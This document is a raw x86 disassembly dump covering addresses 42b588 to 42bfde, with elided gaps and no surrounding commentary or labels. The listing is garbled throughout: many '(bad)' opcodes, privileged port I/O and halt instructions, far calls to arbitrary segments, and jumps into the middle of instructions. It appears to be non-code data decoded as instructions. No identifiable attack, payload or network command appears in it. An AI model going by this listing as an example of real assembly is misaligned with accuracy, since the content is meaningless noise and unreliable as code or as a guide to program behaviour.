  42b588:	test   BYTE PTR [edi],cl
  42b58a:	imul   esp,DWORD PTR [ebp-0x23],0xffffffd4
  42b58e:	add    BYTE PTR [ecx+0x11],dh
  42b591:	aam    0x6a
  42b593:	mov    ecx,0x6be66703
  42b598:	shl    BYTE PTR [ebp-0x31],1
  42b59b:	xor    BYTE PTR [ebx+0xfa6e8f5],bl
  42b5a1:	dec    edx
  42b5a2:	and    BYTE PTR [ebx+edi*8+0x6521a385],al
  42b5a9:	sub    ah,BYTE PTR [edx-0x6e15672a]
  42b5af:	aad    0xc4
  42b5b1:	push   ds
  42b5b2:	dec    ecx
  42b5b3:	and    edi,ecx
  42b5b5:	jl     0x42b5b6
  42b5b7:	or     ecx,ebp
  42b5b9:	xor    ebx,ebp
  42b5bb:	add    BYTE PTR [eax-0x44],cl
  42b5be:	inc    edi
  42b5bf:	popa   
  42b5c0:	mov    ah,0x78
	...
  42b632:	add    BYTE PTR [eax],al
  42b634:	and    al,0x16
  42b636:	outs   dx,BYTE PTR ds:[esi]
  42b637:	(bad)  
  42b638:	jle    0x42b639
  42b63a:	lods   eax,DWORD PTR ds:[esi]
  42b63b:	not    esi
  42b63d:	mov    dl,dh
  42b63f:	add    dl,BYTE PTR [esi+0x5b]
  42b642:	(bad)  
  42b643:	sub    ebp,DWORD PTR [esp+ecx*8]
  42b646:	add    DWORD PTR [eax],eax
  42b648:	test   BYTE PTR [eax],0x0
  42b64b:	add    al,dl
  42b64d:	xchg   esi,eax
  42b64e:	psrld  mm6,QWORD PTR [edx-0x56]
  42b652:	push   cs
  42b653:	loopne 0x42b638
  42b655:	mov    ecx,0x283a341b
  42b65a:	mov    edi,0x37c42aaa
  42b65f:	into   
  42b660:	add    dh,cl
  42b662:	add    ch,BYTE PTR [edi+0x1a]
  42b665:	pop    edx
  42b666:	hlt    
  42b667:	out    0x33,eax
  42b669:	mov    ah,al
  42b66b:	pop    esi
  42b66c:	cmp    BYTE PTR [esp+ebp*4],al
  42b66f:	inc    edx
  42b670:	je     0x42b5fa
  42b672:	xlat   BYTE PTR ds:[ebx]
  42b673:	adc    esp,ebx
  42b675:	sub    al,0x6b
  42b677:	fstp   DWORD PTR [ecx+0x1595dfff]
  42b67d:	ucomiss xmm1,xmm6
  42b680:	in     al,0xaa
  42b682:	jnp    0x42b6d3
  42b684:	jb     0x42b6d9
  42b686:	rcr    DWORD PTR [ecx+0x3ca3c42b],cl
  42b68c:	xchg   BYTE PTR [edx-0x42],ch
  42b68f:	mov    eax,0xe9a6571c
  42b694:	pusha  
  42b695:	xchg   ecx,eax
  42b696:	xchg   BYTE PTR [edi+ebp*8-0x585a4751],bl
  42b69d:	mov    dh,0xa8
  42b69f:	(bad)  
  42b6a0:	jnp    0x42b6ad
  42b6a2:	scas   eax,DWORD PTR es:[edi]
  42b6a3:	mul    BYTE PTR [edi]
  42b6a5:	inc    ebp
  42b6a6:	pop    edx
  42b6a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b6a8:	xor    BYTE PTR [ebp+0x513e9886],bl
  42b6ae:	mov    dl,0xc8
  42b6b0:	sahf   
  42b6b1:	test   DWORD PTR [ebx+0x62],ecx
  42b6b4:	in     eax,0x57
  42b6b6:	push   ss
  42b6b7:	xchg   ebp,esi
  42b6b9:	xchg   ebp,eax
  42b6ba:	push   ebx
  42b6bb:	add    BYTE PTR [edx],0x17
  42b6be:	fist   DWORD PTR [eax+0x2d5f6521]
  42b6c4:	push   eax
  42b6c5:	mov    bl,0x92
  42b6c7:	push   edi
  42b6c8:	hlt    
  42b6c9:	addr16 jns 0x42b68b
  42b6cc:	(bad)  
  42b6cd:	cli    
  42b6ce:	push   0xffffff95
  42b6d0:	(bad)  
  42b6d1:	loopne 0x42b730
  42b6d3:	sbb    BYTE PTR [edi],bl
  42b6d5:	add    al,0x1d
  42b6d7:	and    ch,dl
  42b6d9:	push   ss
  42b6da:	fidiv  WORD PTR ds:0x7d7bc4c5
  42b6e0:	jl     0x42b67f
  42b6e2:	fsub   DWORD PTR [edx+eiz*8+0x3071eba9]
  42b6e9:	les    edi,FWORD PTR [ebp+esi*2-0x19]
  42b6ed:	or     DWORD PTR [eax+0x27502302],ebx
  42b6f3:	out    0xd,eax
  42b6f5:	push   esp
  42b6f6:	dec    esi
  42b6f7:	push   ecx
  42b6f8:	inc    esp
  42b6f9:	mov    ecx,DWORD PTR [ebx]
  42b6fb:	das    
  42b6fc:	gs ins DWORD PTR es:[edi],dx
  42b6fe:	pop    edx
  42b6ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b700:	out    0xd7,al
  42b702:	push   ecx
  42b703:	pop    ebp
  42b704:	pop    es
  42b705:	mov    bl,0x96
  42b707:	jae    0x42b692
  42b709:	ret    0x38de
  42b70c:	mov    ebp,esp
  42b70e:	mov    ebx,0x51038d39
  42b713:	dec    eax
  42b714:	cmc    
  42b715:	push   0x21d15e40
  42b71a:	fnstenv [ecx+ebx*8-0x1]
  42b71e:	ins    BYTE PTR es:[edi],dx
  42b71f:	mov    esi,0x366f054f
  42b724:	sub    BYTE PTR [edx-0x4],bh
  42b727:	sub    BYTE PTR [ecx+ebp*2-0x78309a26],bh
  42b72e:	xor    BYTE PTR [ebx],ch
  42b730:	mov    edx,0x3d3e1812
  42b735:	scas   al,BYTE PTR es:[edi]
  42b736:	sar    BYTE PTR [eax+0x4783050],cl
  42b73c:	pop    edi
  42b73d:	jmp    0x42b793
  42b73f:	push   es
  42b740:	outs   dx,BYTE PTR ds:[esi]
  42b741:	aas    
	...
  42b7b2:	add    BYTE PTR [eax],al
  42b7b4:	mov    ah,BYTE PTR [ebp+0x63]
  42b7b7:	mov    edi,0x75debfef
  42b7bc:	push   0xffffff98
  42b7be:	xor    eax,0xda833bfb
  42b7c3:	mov    ds:0x1cd22,al
  42b7c8:	test   BYTE PTR [eax],0x0
  42b7cb:	add    ch,ah
  42b7cd:	fst    st(0)
  42b7cf:	mov    al,0x5f
  42b7d1:	jmp    0x42b799
  42b7d3:	outs   dx,BYTE PTR ds:[esi]
  42b7d4:	mov    BYTE PTR [esi],bl
  42b7d6:	imul   BYTE PTR [esi+0x7d]
  42b7d9:	mov    al,ds:0xd0b1d3a3
  42b7de:	ss sbb eax,0xa8efa459
  42b7e4:	pop    edx
  42b7e5:	icebp  
  42b7e6:	out    dx,eax
  42b7e7:	adc    DWORD PTR [edi+eax*2],eax
  42b7ea:	mov    ds:0xff86f60a,al
  42b7ef:	adc    dl,BYTE PTR [ebp+0x4d]
  42b7f2:	sbb    eax,0xc84424ab
  42b7f7:	sub    eax,0xfa5ed616
  42b7fc:	fucomi st,st(2)
  42b7fe:	test   eax,0x286dbf3b
  42b803:	daa    
  42b804:	cmp    ecx,edi
  42b806:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b807:	fwait
  42b808:	(bad)  
  42b809:	in     eax,dx
  42b80a:	xlat   BYTE PTR ds:[ebx]
  42b80b:	retf   0x4408
  42b80e:	gs push 0xe393571d
  42b814:	repz ret 0x829b
  42b818:	pop    edx
  42b819:	fst    DWORD PTR [edx+0xacf66f8]
  42b81f:	mov    ebx,0xcc0c8add
  42b824:	idiv   ah
  42b826:	inc    eax
  42b827:	int3   
  42b828:	popf   
  42b829:	inc    edx
  42b82a:	adc    al,0x8
  42b82c:	aad    0xf5
  42b82e:	rol    BYTE PTR [eax+esi*1],0x3f
  42b832:	sar    esi,1
  42b834:	push   edi
  42b835:	cli    
  42b836:	push   esp
  42b837:	sbb    eax,0x225c9da9
  42b83c:	fucom  st(7)
  42b83e:	inc    esp
  42b83f:	fidiv  DWORD PTR [edx]
  42b841:	push   ebx
  42b842:	adc    al,0xe7
  42b844:	aas    
  42b845:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b846:	fdiv   QWORD PTR [esi+0xe]
  42b849:	je     0x42b8aa
  42b84b:	outs   dx,DWORD PTR ds:[esi]
  42b84c:	mov    edx,0x9b43932b
  42b851:	imul   ecx,DWORD PTR [bp+di+0x57f4],0xffffffa3
  42b857:	not    BYTE PTR [edi]
  42b859:	adc    eax,0x38dfe5ae
  42b85e:	push   ebx
  42b85f:	stc    
  42b860:	or     DWORD PTR [eax-0x6539d043],0xffffffa9
  42b867:	into   
  42b868:	mov    ch,0x1a
  42b86a:	push   es
  42b86b:	cmp    ch,BYTE PTR [esi-0x464ec530]
  42b871:	pop    ebx
  42b872:	test   esi,ebx
  42b874:	jnp    0x42b873
  42b876:	xor    ebp,DWORD PTR [esi+0x39bf6e2f]
  42b87c:	outs   dx,DWORD PTR ds:[esi]
  42b87d:	jnp    0x42b8bb
  42b87f:	int    0x9b
  42b881:	pop    ebx
  42b882:	mov    eax,ds:0x78e888ad
  42b887:	lahf   
  42b888:	push   esp
  42b889:	loop   0x42b859
  42b88b:	mov    dh,0x56
  42b88d:	pushf  
  42b88e:	cwde   
  42b88f:	lods   al,BYTE PTR ds:[esi]
  42b890:	fcomp  QWORD PTR [ebp+0x3f281cc1]
  42b896:	sbb    ecx,ebx
  42b898:	or     DWORD PTR [esi],eax
  42b89a:	push   ds
  42b89b:	or     eax,ebp
  42b89d:	push   ebx
  42b89e:	fisttp DWORD PTR [edi-0x6d]
  42b8a1:	adc    BYTE PTR [ebx+0x5b],al
  42b8a4:	dec    edx
  42b8a5:	pop    esi
  42b8a6:	sub    DWORD PTR [edx],esi
  42b8a8:	mov    eax,ds:0x30c94222
  42b8ad:	inc    edi
  42b8ae:	js     0x42b882
  42b8b0:	and    al,0x8f
  42b8b2:	jle    0x42b921
  42b8b4:	pop    DWORD PTR [ebx]
  42b8b6:	mov    al,0xd0
  42b8b8:	call   0xbd40:0xb2f9fdcc
  42b8bf:	push   esp
  42b8c0:	cli    
  42b8c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  42b932:	add    BYTE PTR [eax],al
  42b934:	test   al,0x93
  42b936:	sbb    eax,0xfbee3fee
  42b93b:	xlat   BYTE PTR ds:[ebx]
  42b93c:	ss push esi
  42b93e:	inc    esp
  42b93f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b940:	out    dx,al
  42b941:	inc    bp
  42b943:	and    ebx,DWORD PTR [eax]
  42b945:	into   
  42b946:	add    DWORD PTR [eax],eax
  42b948:	test   BYTE PTR [eax],0x0
  42b94b:	add    BYTE PTR [ebx+0x5b],dl
  42b94e:	mov    esp,0xf726baf3
  42b953:	mov    dl,0xb3
  42b955:	mov    WORD PTR [edx-0xab46f17],gs
  42b95b:	mov    edi,0x75292a6d
  42b960:	jnp    0x42b942
  42b962:	lods   al,BYTE PTR ds:[esi]
  42b963:	(bad)  
  42b964:	xchg   ecx,eax
  42b965:	into   
  42b966:	and    DWORD PTR [edx-0x75e7a638],eax
  42b96c:	mov    eax,ds:0x32b05a02
  42b971:	stc    
  42b972:	mov    eax,ds:0xb0ccf57b
  42b977:	int    0x2e
  42b979:	jmp    0x1027:0xf52b9695
  42b980:	dec    ecx
  42b981:	pushf  
  42b982:	repz add al,0x4
  42b985:	and    bl,dh
  42b987:	or     ch,dh
  42b989:	sbb    eax,DWORD PTR [edx-0x1c3870d7]
  42b98f:	and    DWORD PTR [esi+0x102625f3],eax
  42b995:	inc    ecx
  42b996:	ss sbb eax,0xdae6e64a
  42b99c:	fisttp DWORD PTR [ebp+esi*1+0x1f]
  42b9a0:	add    BYTE PTR es:[ebx-0x10a4e5f],0x9f
  42b9a8:	lods   eax,DWORD PTR ds:[esi]
  42b9a9:	dec    ecx
  42b9aa:	jbe    0x42b9b6
  42b9ac:	test   eax,0x6e5d93ce
  42b9b1:	mov    ds:0x21da4fae,eax
  42b9b6:	jb     0x42b953
  42b9b8:	or     dh,BYTE PTR ds:[edx-0x203dc6c0]
  42b9bf:	(bad)  
  42b9c0:	fisttp WORD PTR [esi+0x1a4100e7]
  42b9c6:	leave  
  42b9c7:	mov    edi,0xea4ee440
  42b9cc:	mov    eax,0x328188aa
  42b9d1:	hlt    
  42b9d2:	(bad)  
  42b9d3:	lods   al,BYTE PTR ds:[esi]
  42b9d4:	mov    ds,WORD PTR [ebp+0x16]
  42b9d7:	jecxz  0x42ba04
  42b9d9:	je     0x42b97c
  42b9db:	inc    esi
  42b9dc:	jo     0x42ba2d
  42b9de:	out    0x80,al
  42b9e0:	or     BYTE PTR ds:0x368c2337,al
  42b9e6:	push   eax
  42b9e7:	add    BYTE PTR [esi-0x31de564],bh
  42b9ed:	cmp    al,0x3e
  42b9ef:	pop    esi
  42b9f0:	push   es
  42b9f1:	xor    al,0x16
  42b9f3:	data16 mov dh,0x82
  42b9f6:	fistp  WORD PTR [esi+0x4f]
  42b9f9:	or     BYTE PTR [ebx+eiz*2-0x40],al
  42b9fd:	mov    ch,0x74
  42b9ff:	hlt    
  42ba00:	xchg   BYTE PTR [eax-0x738c68b0],cl
  42ba06:	gs cli 
  42ba08:	(bad)
  42ba0c:	lds    ebx,FWORD PTR [esp+edi*8-0x57]
  42ba10:	sbb    eax,0x9e7565f1
  42ba15:	mov    bl,0xb0
  42ba17:	cmp    al,0x1b
  42ba19:	and    BYTE PTR [eax+0x7396eb4b],ch
  42ba1f:	lods   al,BYTE PTR ds:[esi]
  42ba20:	fidivr DWORD PTR [edx]
  42ba22:	jle    0x42b9c2
  42ba24:	sub    dl,BYTE PTR [ebx-0x52]
  42ba27:	inc    esi
  42ba28:	cs ja  0x42b9ee
  42ba2b:	push   cs
  42ba2c:	pop    edx
  42ba2d:	mov    al,ds:0xce3412a
  42ba32:	fisttp QWORD PTR [edx+0x3b]
  42ba35:	push   ds
  42ba36:	addr16 loopne 0x42ba4e
  42ba39:	or     eax,0x53436ed1
  42ba3e:	imul   ebx,DWORD PTR [edx+0x46],0xffffff93
	...
  42bab2:	add    BYTE PTR [eax],al
  42bab4:	ds push cs
  42bab6:	sub    al,0x5d
  42bab8:	cmp    al,0x7f
  42baba:	jg     0x42bb2b
  42babc:	cmp    al,BYTE PTR [esi+0x52c7434c]
  42bac2:	in     eax,dx
  42bac3:	add    DWORD PTR [esi],ecx
  42bac5:	iret   
  42bac6:	add    DWORD PTR [eax],eax
  42bac8:	test   BYTE PTR [eax],0x0
  42bacb:	add    bh,dl
  42bacd:	push   0x33
  42bacf:	adc    ebx,DWORD PTR [edx-0x7c]
  42bad2:	test   cl,bh
  42bad4:	mov    bh,0xbe
  42bad6:	daa    
  42bad7:	into   
  42bad8:	pushf  
  42bad9:	adc    eax,0xa73fb8b9
  42bade:	inc    ebp
  42badf:	loopne 0x42bae5
  42bae1:	push   edx
  42bae2:	aaa    
  42bae3:	(bad)  
  42bae4:	arpl   di,ax
  42bae6:	add    edx,esi
  42bae8:	sbb    eax,0x1ba7d6c7
  42baed:	lods   al,BYTE PTR ds:[esi]
  42baee:	mov    esp,0x87e4f90c
  42baf3:	aas    
  42baf4:	and    ecx,DWORD PTR [ecx]
  42baf6:	push   edi
  42baf7:	push   0xed75baf6
  42bafc:	xor    DWORD PTR fs:[edi+0x59],0xe01a47c9
  42bb04:	push   ebp
  42bb05:	adc    al,0x9d
  42bb07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bb08:	call   0x1b39:0xfd1f9838
  42bb0f:	ret    0xf8af
  42bb12:	stos   DWORD PTR es:[edi],eax
  42bb13:	dec    eax
  42bb14:	dec    ebx
  42bb15:	cmp    ebp,DWORD PTR [eax+esi*2+0x2d5caff8]
  42bb1c:	cli    
  42bb1d:	sbb    al,0xd3
  42bb1f:	xor    ch,BYTE PTR [esi-0x8b68e13]
  42bb25:	cld    
  42bb26:	xchg   edi,eax
  42bb27:	or     ch,BYTE PTR [edi+0x776f457]
  42bb2d:	inc    edx
  42bb2e:	leave  
  42bb2f:	xchg   DWORD PTR [edx],ebx
  42bb31:	adc    BYTE PTR [edi+0x50f0a84a],ch
  42bb37:	ins    DWORD PTR es:[edi],dx
  42bb38:	inc    edi
  42bb39:	lahf   
  42bb3a:	pop    eax
  42bb3b:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  42bb3d:	jmp    0x42bb75
  42bb3f:	jl     0x42baf4
  42bb41:	add    esp,ebp
  42bb43:	push   0xe95753e7
  42bb48:	enter  0x11ab,0xe4
  42bb4c:	dec    ebx
  42bb4d:	xchg   ecx,eax
  42bb4e:	in     eax,0x3f
  42bb50:	in     eax,0x8c
  42bb52:	rol    DWORD PTR [ebp-0x74],1
  42bb55:	std    
  42bb56:	mov    ebx,0x63ef2d51
  42bb5b:	rcr    DWORD PTR [edx],1
  42bb5d:	add    ebx,esp
  42bb5f:	sbb    ch,BYTE PTR ds:0xa939df41
  42bb65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bb66:	lods   al,BYTE PTR ds:[esi]
  42bb67:	arpl   WORD PTR [edi-0x36],si
  42bb6a:	or     BYTE PTR [ebp+0x50],ah
  42bb6d:	sub    eax,0x462bebf8
  42bb72:	(bad)  
  42bb73:	mov    dh,0xb1
  42bb75:	pop    edi
  42bb76:	jne    0x42bb97
  42bb78:	loope  0x42bbba
  42bb7a:	fidivr WORD PTR [esi+0x7e]
  42bb7d:	les    esp,FWORD PTR [ebx-0x4c]
  42bb80:	and    eax,0xa2bd6543
  42bb85:	push   ds
  42bb86:	dec    edx
  42bb87:	add    eax,0x51df1de7
  42bb8c:	enter  0xe0cf,0xc0
  42bb90:	push   esp
  42bb91:	rol    BYTE PTR [ebx-0x14],cl
  42bb94:	xor    dh,BYTE PTR [eax-0x899b7f0]
  42bb9a:	mov    al,0x3
  42bb9c:	cld    
  42bb9d:	sub    dl,BYTE PTR [edi+ecx*4-0xa706ba2]
  42bba4:	and    DWORD PTR [ebx+eiz*1-0x269a00a6],ebx
  42bbab:	lock push ss
  42bbad:	daa    
  42bbae:	dec    eax
  42bbaf:	fst    QWORD PTR [ebx]
  42bbb1:	push   cs
  42bbb2:	mov    ss,WORD PTR ds:0xdef01599
  42bbb8:	xchg   cl,cl
  42bbba:	outs   dx,DWORD PTR ds:[esi]
  42bbbb:	pop    eax
  42bbbc:	adc    eax,0x16e461d1
  42bbc1:	ret    
	...
  42bc32:	add    BYTE PTR [eax],al
  42bc34:	jmp    0xdf7cd86b
  42bc39:	ds out dx,eax
  42bc3b:	repz ffreep st(2)
  42bc3e:	(bad)  
  42bc3f:	aam    0x91
  42bc41:	imul   edi,DWORD PTR [esi+0x1d0047f],0x0
  42bc48:	test   BYTE PTR [eax],0x0
  42bc4b:	add    BYTE PTR [eax],ah
  42bc4d:	or     ah,BYTE PTR [esi-0x4a]
  42bc50:	push   edi
  42bc51:	stc    
  42bc52:	ss js  0x42bc7f
  42bc55:	mov    bl,0x17
  42bc57:	xor    BYTE PTR [edx-0x6d],ah
  42bc5a:	ret    0x977a
  42bc5d:	mov    esp,0xe9f1be6
  42bc62:	bswap  ebx
  42bc64:	inc    esi
  42bc65:	in     eax,0xb
  42bc67:	int3   
  42bc68:	(bad)  
  42bc69:	ja     0x42bcbb
  42bc6b:	int3   
  42bc6c:	push   cs
  42bc6d:	dec    edx
  42bc6e:	push   eax
  42bc6f:	ror    DWORD PTR [eax],0xf0
  42bc72:	cli    
  42bc73:	jl     0x42bc93
  42bc75:	daa    
  42bc76:	xchg   ebx,eax
  42bc77:	aam    0xb5
  42bc79:	mov    ecx,0xa7877563
  42bc7e:	sbb    edx,DWORD PTR [ebx+0x5ebd0ca7]
  42bc84:	or     ebx,DWORD PTR [esi+0xa69eb5e]
  42bc8a:	call   0x6208:0xaec566b5
  42bc91:	xor    BYTE PTR [ebp+0x5a7ec34c],bl
  42bc97:	cli    
  42bc98:	or     eax,DWORD PTR [eax+0x2dff3c34]
  42bc9e:	into   
  42bc9f:	int3   
  42bca0:	and    ebx,DWORD PTR [ebx+0x262c0e4b]
  42bca6:	sub    BYTE PTR [ebx+esi*1-0x41],bh
  42bcaa:	sbb    ebp,DWORD PTR [esi+0x55]
  42bcad:	add    edx,0xffffff8e
  42bcb0:	dec    BYTE PTR [esi+0xbc73727]
  42bcb6:	mov    ah,0xae
  42bcb8:	mov    ah,0x61
  42bcba:	mov    ch,0xbc
  42bcbc:	push   cs
  42bcbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bcbe:	mov    edx,0xbb4c7e5c
  42bcc3:	test   eax,0x57e6e8f8
  42bcc8:	or     dl,al
  42bcca:	jmp    0x42bc8d
  42bccc:	stos   BYTE PTR es:[edi],al
  42bccd:	cmp    eax,0x27cba066
  42bcd2:	push   es
  42bcd3:	adc    ch,BYTE PTR [ebx-0x67ffae16]
  42bcd9:	arpl   WORD PTR [ecx+0x6394f3c9],di
  42bcdf:	dec    ebp
  42bce0:	jmp    FWORD PTR [ebp+0x5353b97]
  42bce6:	std    
  42bce7:	sbb    ch,ah
  42bce9:	cmp    BYTE PTR [edx+0x8],cl
  42bcec:	or     DWORD PTR ds:0x20f74bb2,esp
  42bcf2:	xchg   edx,eax
  42bcf3:	fcmove st,st(2)
  42bcf5:	or     eax,ecx
  42bcf7:	pop    ds
  42bcf8:	cld    
  42bcf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bcfa:	add    al,0x66
  42bcfc:	daa    
  42bcfd:	mov    ebx,ecx
  42bcff:	xor    edi,DWORD PTR ds:0xac2a76e9
  42bd05:	std    
  42bd06:	jnp    0x42bce8
  42bd08:	add    al,0x13
  42bd0a:	pop    es
  42bd0b:	mov    ebp,0x7838447e
  42bd10:	dec    edi
  42bd11:	push   ebp
  42bd12:	es pop esi
  42bd14:	loope  0x42bd12
  42bd16:	xchg   ebx,eax
  42bd17:	inc    ecx
  42bd18:	push   cs
  42bd19:	stos   BYTE PTR es:[edi],al
  42bd1a:	xor    eax,0x5573cf27
  42bd1f:	retf   0xed3f
  42bd22:	(bad)  
  42bd23:	mov    esp,DWORD PTR [ecx+0x1291ff77]
  42bd29:	and    esi,DWORD PTR [esp+eax*1+0x33]
  42bd2d:	jecxz  0x42bd32
  42bd2f:	pop    ebp
  42bd31:	jge    0x42bcb8
  42bd33:	out    0xc1,eax
  42bd35:	mov    ds:0x93036fae,eax
  42bd3a:	adc    eax,0x252d95c3
  42bd3f:	mov    cl,0x73
  42bd41:	pop    DWORD PTR [eax]
	...
  42bdb3:	add    BYTE PTR [edi+0x4a8e4af7],bh
  42bdb9:	mov    edi,0x5143f7ff
  42bdbe:	jne    0x42bdcc
  42bdc0:	aam    0x29
  42bdc2:	stos   DWORD PTR es:[edi],eax
  42bdc3:	jns    0x42bdbf
  42bdc5:	rol    BYTE PTR [ecx],1
  42bdc7:	add    dh,dh
  42bdc9:	add    BYTE PTR [eax],al
  42bdcb:	add    bl,bl
  42bdcd:	and    ebx,edx
  42bdcf:	loopne 0x42bd52
  42bdd1:	or     edi,DWORD PTR [eax-0x6eaa03d2]
  42bdd7:	stc    
  42bdd8:	mov    ds:0xc969a294,eax
  42bddd:	stc    
  42bdde:	shr    BYTE PTR [edx-0x7f],0x38
  42bde2:	jae    0x42be60
  42bde4:	je     0x42be48
  42bde6:	cld    
  42bde7:	or     esp,edi
  42bde9:	outs   dx,DWORD PTR ds:[esi]
  42bdea:	fmul   QWORD PTR [ebx]
  42bdec:	popf   
  42bded:	retf   0xc9fe
  42bdf0:	push   cs
  42bdf1:	inc    ebx
  42bdf2:	and    al,0xab
  42bdf4:	je     0x42bded
  42bdf6:	jp     0x42be72
  42bdf8:	mov    esp,0xa63cd139
  42bdfd:	gs mov dh,0xe6
  42be00:	mov    edi,0x7151b6f0
  42be05:	cmp    ch,BYTE PTR [edi-0x11b87fd3]
  42be0b:	out    dx,al
  42be0c:	sbb    BYTE PTR [ebx],0x30
  42be0f:	mov    eax,0xdad4b2f0
  42be14:	leave  
  42be15:	inc    edx
  42be16:	pop    ss
  42be17:	jmp    0x42be15
  42be19:	push   edi
  42be1a:	lahf   
  42be1b:	pop    eax
  42be1c:	add    bl,bl
  42be1e:	(bad)  
  42be1f:	(bad)  
  42be20:	xchg   ebp,eax
  42be21:	dec    esi
  42be22:	enter  0xafcf,0xa0
  42be26:	outs   dx,BYTE PTR ds:[esi]
  42be27:	div    BYTE PTR [eax+0x6e059a8]
  42be2d:	cs jno 0x42be7d
  42be30:	cwde   
  42be31:	mov    al,0xc9
  42be33:	hlt    
  42be34:	jbe    0x42be3c
  42be36:	add    ebx,DWORD PTR [edx+0x88346ee]
  42be3c:	jg     0x42bea1
  42be3e:	jecxz  0x42be59
  42be40:	inc    ecx
  42be41:	cmp    eax,0xfc0d5946
  42be46:	mov    BYTE PTR [ecx],ah
  42be48:	daa    
  42be49:	scas   eax,DWORD PTR es:[edi]
  42be4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42be4b:	add    eax,0xeb981d9a
  42be50:	aad    0x97
  42be52:	pop    edx
  42be53:	fdiv   QWORD PTR [ebp-0x2]
  42be56:	inc    ecx
  42be57:	in     al,0x17
  42be59:	mov    dl,0x78
  42be5b:	xor    cl,0x3f
  42be5e:	jl     0x42be28
  42be60:	ja     0x42bdfd
  42be62:	pop    eax
  42be63:	rcl    DWORD PTR [edx],1
  42be65:	icebp  
  42be66:	jbe    0x42be44
  42be68:	push   eax
  42be69:	mov    ah,0x5
  42be6b:	icebp  
  42be6c:	push   0xcb879d46
  42be71:	pop    ecx
  42be72:	jle    0x42beca
  42be74:	in     al,0x52
  42be76:	cmp    esp,edx
  42be78:	mov    eax,ds:0x55cdb744
  42be7d:	dec    ecx
  42be7e:	pop    ds
  42be7f:	leave  
  42be80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42be81:	jge    0x42be43
  42be83:	imul   eax,eax,0xfffffffd
  42be86:	xchg   ebp,eax
  42be87:	mul    dh
  42be89:	jl     0x42be26
  42be8b:	jmp    0x42be46
  42be8d:	fild   WORD PTR [edx]
  42be8f:	sub    esp,edx
  42be91:	aad    0xf2
  42be93:	in     al,dx
  42be94:	mov    bl,0x6e
  42be96:	pop    ecx
  42be97:	xor    al,0x69
  42be99:	out    0x27,eax
  42be9b:	ins    DWORD PTR es:[edi],dx
  42be9c:	loopne 0x42be9f
  42be9e:	push   ss
  42be9f:	rol    BYTE PTR [ebx+0x5ca51225],cl
  42bea5:	(bad)  [edx*8-0x793b17d1]
  42beac:	mov    dh,0x43
  42beae:	into   
  42beaf:	dec    eax
  42beb0:	es jne 0x42bf0d
  42beb3:	add    esi,DWORD PTR [ecx]
  42beb5:	adc    BYTE PTR [esi+esi*8-0x61f4cfb],bl
  42bebc:	sub    esi,DWORD PTR [edi-0x23]
  42bebf:	xchg   BYTE PTR [ebp+ecx*2+0x0],al
	...
  42bf33:	add    cl,bh
  42bf35:	enter  0xdc7a,0x7b
  42bf39:	(bad)  
  42bf3a:	(bad)  
  42bf3b:	in     eax,dx
  42bf3c:	out    dx,al
  42bf3d:	mov    ah,0x3
  42bf3f:	dec    ecx
  42bf40:	je     0x42bf44
  42bf42:	push   ds
  42bf43:	jmp    0xf6:0x1d1f0
  42bf4a:	add    BYTE PTR [eax],al
  42bf4c:	sbb    esp,DWORD PTR [ecx]
  42bf4e:	jb     0x42bef9
  42bf50:	cdq    
  42bf51:	outs   dx,BYTE PTR ds:[esi]
  42bf52:	pop    ss
  42bf53:	jno    0x42bf19
  42bf55:	xchg   ah,bl
  42bf57:	lock inc edx
  42bf59:	(bad)  [ebp+0x1d710f72]
  42bf5f:	(bad)  
  42bf60:	loopne 0x42bf3d
  42bf62:	dec    ebx
  42bf63:	xor    al,0xdd
  42bf65:	jmp    0xdbd7194b
  42bf6a:	xor    bh,0x68
  42bf6d:	ss dec edx
  42bf6f:	ror    DWORD PTR [ebx],0x25
  42bf72:	test   esi,esi
  42bf74:	daa    
  42bf75:	fcmovnbe st,st(6)
  42bf77:	jns    0x42bf17
  42bf79:	inc    esi
  42bf7a:	cld    
  42bf7b:	sahf   
  42bf7c:	pop    ss
  42bf7d:	in     al,0xe1
  42bf7f:	iret   
  42bf80:	fbstp  TBYTE PTR [esi+0x34bd1670]
  42bf86:	add    ebp,DWORD PTR [edi+0x71]
  42bf89:	sbb    eax,0x7c463d1b
  42bf8e:	std    
  42bf8f:	or     eax,0x4db87669
  42bf94:	ins    DWORD PTR es:[edi],dx
  42bf95:	lods   al,BYTE PTR ds:[esi]
  42bf96:	(bad)  [ebx]
  42bf98:	and    edi,DWORD PTR [esi]
  42bf9a:	and    eax,0x589ebdb
  42bf9f:	cmp    eax,0xc5a8fd97
  42bfa4:	mov    bh,0x9a
  42bfa6:	pop    esp
  42bfa7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bfa8:	daa    
  42bfa9:	xchg   edx,eax
  42bfaa:	sti    
  42bfab:	out    dx,eax
  42bfac:	sub    al,0xab
  42bfae:	push   edx
  42bfaf:	ficomp WORD PTR [ebx-0x7ad3b762]
  42bfb5:	lea    ecx,[ecx-0x635f35d]
  42bfbb:	jb     0x42bf52
  42bfbd:	jo     0x42bf96
  42bfbf:	loopne 0x42bf62
  42bfc1:	arpl   bp,di
  42bfc3:	cmc    
  42bfc4:	mov    cl,0xc1
  42bfc6:	jg     0x42bf97
  42bfc8:	shl    BYTE PTR [ebx],1
  42bfca:	sbb    dl,BYTE PTR [ebx]
  42bfcc:	jae    0x42bfba
  42bfce:	pop    edi
  42bfcf:	jge    0x42bf6c
  42bfd1:	mov    esp,0xe98259b8
  42bfd6:	inc    ebx
  42bfd7:	xlat   BYTE PTR ds:[ebx]
  42bfd8:	jb     0x42bf8c
  42bfda:	push   esi
  42bfdb:	fsubr  st,st(3)
  42bfdd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bfde:	mov    eax,0x1ce57b48
